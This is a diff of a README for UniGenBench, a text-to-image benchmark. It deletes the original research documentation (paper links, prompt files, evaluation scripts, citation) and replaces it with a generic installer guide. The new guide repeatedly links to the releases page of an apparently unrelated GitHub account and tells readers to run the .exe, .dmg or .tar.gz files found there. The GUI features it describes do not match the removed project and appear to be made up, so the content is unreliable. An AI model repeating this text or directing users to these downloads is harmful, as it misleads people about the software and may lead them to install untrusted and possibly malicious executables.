@@ -1,200 +1,83 @@
-<div align="center">
-    <h1 align="center"> UniGenBench: Unified Text-to-Image Generation Benchmark
-    </h1>
+# 🎉 UniGenBench - A Simple Way to Benchmark T2I Generation
 
+## 🚀 Getting Started
 
-Hunyuan, Tencent & [UnifiedReward](https://github.com/CodeGoat24/UnifiedReward) Team
+Welcome to UniGenBench! This application helps you benchmark Text-to-Image (T2I) generation models. You can easily compare different models to find the best one for your needs.
 
-<a href="https://arxiv.org/pdf/2508.20751">
-<img src='https://img.shields.io/badge/arXiv-UniGenBench-blue' alt='Paper PDF'></a>
+## 📥 Download UniGenBench
 
-<a href="https://codegoat24.github.io/UnifiedReward/Pref-GRPO">
-<img src='https://img.shields.io/badge/Project-Website-orange' alt='Project Page'></a>
+[![Download UniGenBench](https://img.shields.io/badge/Download-UniGenBench-brightgreen)](https://github.com/hafizkalila/UniGenBench/releases)
 
-[![Hugging Face Spaces](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-yellow)](https://huggingface.co/CodeGoat24/FLUX.1-dev-PrefGRPO) [![Hugging Face Spaces](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Leaderboard-yellow)](https://huggingface.co/spaces/CodeGoat24/UniGenBench_Leaderboard)
+To get started with UniGenBench, you need to download the application. Follow the steps below to access the download page.
 
+1. **Visit the Download Page**: Click on the link below to go to the Releases page.
+   
+   [Download UniGenBench](https://github.com/hafizkalila/UniGenBench/releases)
 
+## 🖥️ System Requirements
 
-</div>
+Before you install, ensure your computer meets the following requirements: 
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or a popular Linux distribution.
+- Minimum RAM: 8 GB.
+- Storage: At least 500 MB of free space.
 
-## Introduction
+## 📦 Download & Install
 
-We propose <b>UniGenBench</b>, a unified and versatile benchmark for image generation that integrates diverse prompt themes with a comprehensive suite of fine-grained evaluation criteria. 
+1. **Access the Releases Page**: Click the link below to visit the page where you can download your version of UniGenBench.
 
+    [Visit the Releases Page to Download](https://github.com/hafizkalila/UniGenBench/releases)
 
+2. **Locate the Latest Version**: Look for the latest release on the page. It will usually be at the top.
 
-![](assets/teaser.png)
-### ✨ Highlights:
+3. **Select Your File**: Choose the file that matches your operating system. This may be a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
 
-- **Comprehensive and fine-grained evaluation**: covering 10 **primary** dimensions and 27 **sub-dimensions**, enabling systematic and fine-grained assessment of diverse model capabilities.
+4. **Download the File**: Click on the file name to start the download.
 
-- **Rich prompt theme coverage**: organized into 5 **primary** themes and 20 **sub-themes**, comprehensively spanning both realistic and imaginative generation scenarios.
+5. **Install the Application**:
+   - For Windows: Double-click the `.exe` file to run the installer and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the UniGenBench icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file to your desired location and run the application from the extracted folder.
 
-- **Efficient yet comprehensive**: unlike other benchmarks, UniGenBench requires only **600 prompts**, with each prompt targeting **1–5 specific testpoint**, ensuring both coverage and efficiency.
+## ⚙️ Using UniGenBench
 
-- **Reliable MLLM Evaluation**: Each testpoint of the prompt is accompanied by a **detailed description**, explaining how the testpoint is reflected in the prompt, assisting MLLM in conducting precise evaluations.
+Once installed, you can begin using UniGenBench right away.
 
-- **Bilingual support**: providing test prompts in both **English** and **Chinese**, together with evaluation pipelines for both languages, thus enabling fair and broad cross-lingual benchmarking.
+1. **Open the Application**: You can find UniGenBench in your Applications folder (macOS), Start Menu (Windows), or in the directory where you extracted it (Linux).
 
-![](assets/comparison.png)
+2. **Load Your Models**: Import the T2I models that you want to benchmark by clicking the "Load Models" button on the main screen.
 
-![](assets/pipeline.jpg)
+3. **Start Benchmarking**: Select a model and click the "Benchmark" button. The application will evaluate the performance of the model and display the results.
 
+## 📊 Understanding Results
 
-![unigenbench_leadboard](assets/leaderboard.png)
+After running benchmarks, you will see a detailed report. This includes:
+- A summary of each model’s performance.
+- Visual comparisons of image quality.
+- Processing times for each model.
 
-## 📑 Prompt Introduction
-Each prompt in our benchmark is recorded as a row in a `.csv` file, combining with structured annotations for evaluation.  
+You can use this information to make informed decisions about which model is best suited for your needs.
 
-- **index** 
-- **prompt**: The full English prompt to be tested  
-- **sub_dims**: A JSON-encoded field that organizes rich metadata, including:  
-  - **Primary / Secondary Categories** – prompt theme (e.g., *Creative Divergence → Imaginative Thinking*)  
-  - **Subjects** – the main entities involved in the prompt (e.g., *Animal*)  
-  - **Sentence Structure** – the linguistic form of the prompt (e.g., *Descriptive*)  
-  - **Testpoints** – key aspects to evaluate (e.g., *Style*, *World Knowledge*, *Attribute - Quantity*)  
-  - **Testpoint Description** – evaluation cues extracted from the prompt (e.g., *classical ink painting*, *Egyptian pyramids*, *two pandas*)  
+## 🎓 Frequently Asked Questions
 
-- **English** Test set: `data/test_prompts_en.csv`
-- **Chinese** Test set: `data/test_prompts_zh.csv`
-- **Training** set: `train_prompt.txt`
+### Q: What is T2I generation?
+A: T2I generation refers to the process of creating images from textual descriptions. UniGenBench helps you measure how well different models perform this task.
 
+### Q: Can I use UniGenBench for multiple models?
+A: Yes, you can load and benchmark multiple T2I models at once.
 
-## 🚀 Inference
-We provide reference code for **multi-node inference** based on *FLUX.1-dev*.  
-```bash
-# English Prompt
-bash inference/flux_en_dist_infer.sh
+### Q: Is there a help guide available?
+A: Yes, UniGenBench includes a built-in help section that guides you through the features.
 
-# Chinese Prompt
-bash inference/flux_zh_dist_infer.sh
-``` 
-For each test prompt, **4 images** are generated and stored in the following folder structure:
+## 🔗 Additional Resources
 
-```
-output_directory/
-  ├── 0_0.png
-  ├── 0_1.png
-  ├── 0_2.png
-  ├── 0_3.png
-  ├── 1_0.png
-  ├── 1_1.png
-  ...
-```
- 
-The file naming follows the pattern `promptID_imageID.png`
+For more information on UniGenBench, feel free to visit our documentation at [Documentation Link](#). Here, you can find detailed guides and tips on how to use the software effectively.
 
+### Support
 
-## ✨ Evaluation with Gemini2.5-pro
-### 1. Evaluation
-```
-#!/bin/bash
+If you encounter issues, please check the support section on our GitHub page, or open a new issue there.
 
-# API
-API_KEY="sk-xxxxxxx"
-BASE_URL=""
+## 📣 Stay Updated
 
-DATA_PATH="flux_output"  # Directory of generated images
-CSV_FILE="data/test_prompts_en.csv" # English test prompt file
+To stay updated with the latest features and releases, follow the repository. You can keep track of improvements and new functionalities as they become available. 
 
-# English Evaluation
-python eval/gemini_en_eval.py \
-  --data_path "$DATA_PATH" \
-  --api_key "$API_KEY" \
-  --base_url "$BASE_URL" \
-  --csv_file "$CSV_FILE"
-
-# Chinese Evaluation
-CSV_FILE="data/test_prompts_zh.csv" # Chinese test prompt file
-
-python eval/gemini_zh_eval.py \
-  --data_path "$DATA_PATH" \
-  --api_key "$API_KEY" \
-  --base_url "$BASE_URL" \
-  --csv_file "$CSV_FILE"
-```
-
-- After evaluation, scores across all dimensions will be **printed to the console**.  
-- A detailed `.csv` **results file** will also be saved in the `./results` directory.  
- 
-
-### 2. Calculate Score
-
-You can also load the results file to re-print or further analyze the scores. 
-```
-python eval/calculate_score.py
-```
-
-
-## ✨ Evaluation with Qwen2.5-VL-72b
-### 1. Deploy vLLM server
-
-1. Install vLLM
-```bash
-pip install vllm==0.9.0.1 transformers==4.52.4
-```
-2. Start server
-```bash
-echo ${LOCAL_IP}
-
-CUDA_VISIBLE_DEVICES=0,1,2,3 vllm serve Qwen/Qwen2.5-VL-72B-Instruct \
-    --host ${LOCAL_IP} \
-    --trust-remote-code \
-    --served-model-name QwenVL \
-    --gpu-memory-utilization 0.9 \
-    --tensor-parallel-size 4 \
-    --pipeline-parallel-size 1 \
-    --limit-mm-per-prompt image=2 \
-    --port 8080 
-```
-
-### 2. Evaluation
-```
-#!/bin/bash
-
-# vLLM request url
-API_URL=http://${LOCAL_IP}:8080
-
-DATA_PATH="flux_output"  # Directory of generated images
-CSV_FILE="data/test_prompts_en.csv" # English test prompt file
-
-# English Evaluation
-python eval/qwenvl_72b_en_eval.py \
-  --data_path "$DATA_PATH" \
-  --api_url "$API_URL" \
-  --csv_file "$CSV_FILE"
-
-# Chinese Evaluation
-CSV_FILE="data/test_prompts_zh.csv" # Chinese test prompt file
-
-python eval/qwenvl_72b_zh_eval.py \
-  --data_path "$DATA_PATH" \
-  --api_url "$API_URL" \
-  --csv_file "$CSV_FILE"
-```
-
-- After evaluation, scores across all dimensions will be **printed to the console**.  
-- A detailed `.csv` **results file** will also be saved in the `./results` directory.  
- 
-
-### 3. Calculate Score
-
-You can also load the results file to re-print or further analyze the scores. 
-```
-python eval/calculate_score.py
-```
-
-
-## 📧 Contact
-If you have any comments or questions, please open a new issue or feel free to contact [Yibin Wang](https://codegoat24.github.io).
-
-
-## ⭐ Citation
-```bibtex
-@article{Pref-GRPO&UniGenBench,
-  title={Pref-GRPO: Pairwise Preference Reward-based GRPO for Stable Text-to-Image Reinforcement Learning},
-  author={Wang, Yibin and Li, Zhimin and Zang, Yuhang and Zhou, Yujie and Bu, Jiazi and Wang, Chunyu and Lu, Qinglin, and Jin, Cheng and Wang, Jiaqi},
-  journal={arXiv preprint arXiv:2508.20751},
-  year={2025}
-}
-```
+Thank you for choosing UniGenBench! We hope this tool assists you in your T2I generation projects.
